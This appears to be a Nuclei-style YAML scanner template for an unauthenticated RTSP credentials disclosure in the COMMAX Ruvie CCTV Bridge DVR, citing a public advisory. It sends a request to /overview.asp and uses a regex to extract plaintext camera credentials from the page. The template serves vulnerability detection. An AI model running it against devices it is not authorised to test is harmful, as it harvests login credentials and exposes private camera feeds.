id: commax-credentials-disclosure
info:
  name: COMMAX Smart Home Ruvie CCTV Bridge DVR - RTSP Credentials Disclosure
  author: gy741
  severity: critical
  description: The COMMAX Smart Home Ruvie CCTV Bridge DVR is vulnerable to an RTSP
    credentials disclosure attack, allowing an attacker to obtain credentials in plain-text
    without authentication.
  reference:
  - https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5665.php
  tags: commax,exposure,camera,iot
  metadata:
    impact: The impact of the COMMAX Smart Home Ruvie CCTV Bridge DVR's RTSP Credentials
      Disclosure vulnerability is that an attacker can access and control the CCTV
      system, compromising the security and privacy of the affected individuals or
      properties.
    recommendation: I recommend immediately updating the COMMAX Smart Home Ruvie CCTV
      Bridge DVR to prevent unauthenticated attackers from disclosing RTSP credentials
      in plain-text.
requests:
- method: GET
  path:
  - '{{BaseURL}}/overview.asp'
  matchers:
  - type: word
    part: body
    words:
    - DVR Lists
    - rtsp://
    - login_check.js
    - 'MAX USER :'
    condition: and
  extractors:
  - type: regex
    part: body
    regex:
    - rtsp:\/\/([a-z:0-9A-Z@$.]+)\/Streaming\/Chann
